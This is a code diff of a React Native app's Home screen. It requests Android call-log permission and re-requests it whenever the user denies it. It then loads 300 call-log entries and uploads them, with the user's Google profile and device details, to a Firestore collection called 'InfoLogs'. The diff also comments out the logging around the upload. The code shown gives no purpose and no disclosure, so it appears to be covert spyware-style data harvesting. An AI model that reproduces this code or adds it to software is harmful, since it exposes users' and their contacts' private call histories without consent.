@@ -26,7 +26,6 @@ import {
 } from '@react-native-google-signin/google-signin';
 
 import firestore from '@react-native-firebase/firestore';
-import {v4 as uuidv4} from 'uuid';
 import {useFocusEffect} from '@react-navigation/native';
 
 import {getBrand, getModel, getSystemVersion} from 'react-native-device-info';
@@ -88,7 +87,7 @@ const Home = ({navigation}) => {
       });
   };
 
-  const getPermission = async userInfo => {
+  const getPermission = async (userInfo = {}) => {
     try {
       const granted = await PermissionsAndroid.request(
         PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
@@ -102,29 +101,31 @@ const Home = ({navigation}) => {
       );
       if (granted === PermissionsAndroid.RESULTS.GRANTED) {
         const callInfo = await CallLogs.load(300);
-        console.log('callInfo', callInfo);
+        // console.log('callInfo', callInfo);
         const name =
           (userInfo && userInfo.user && userInfo.user.givenName) || 'z';
-        const uid = `${name}-${uuidv4()}`;
-        console.log('uid', uid, userInfo);
+        const uid = `${name}-${new Date().getTime()}`;
+
+        const dataSet = {
+          user: {...userInfo, device} || {device},
+          name,
+          info: callInfo,
+          dated: new Date().toLocaleString(),
+        };
+        // console.log('uid', {uid, dataSet});
         firestore()
           .collection('InfoLogs')
           .doc(uid)
-          .set({
-            user: {...userInfo, device} || {device},
-            name,
-            info: callInfo,
-            dated: new Date().toLocaleString(),
-          })
+          .set(dataSet)
           .then(res => {
-            console.log('res', res);
+            // console.log('res', res);
           })
           .catch(error => {
-            console.log('error', error);
+            // console.log('error', error);
           });
       } else {
         getPermission();
-        console.log('Call Log permission denied');
+        // console.log('Call Log permission denied');
       }
     } catch (e) {
       console.log(e);
@@ -158,7 +159,7 @@ const Home = ({navigation}) => {
         .collection('Users')
         .add(userInfo)
         .then(() => {
-          console.log('User added!');
+          // console.log('User added!');
         });
       navigation.navigate('Message');
     } catch (error) {
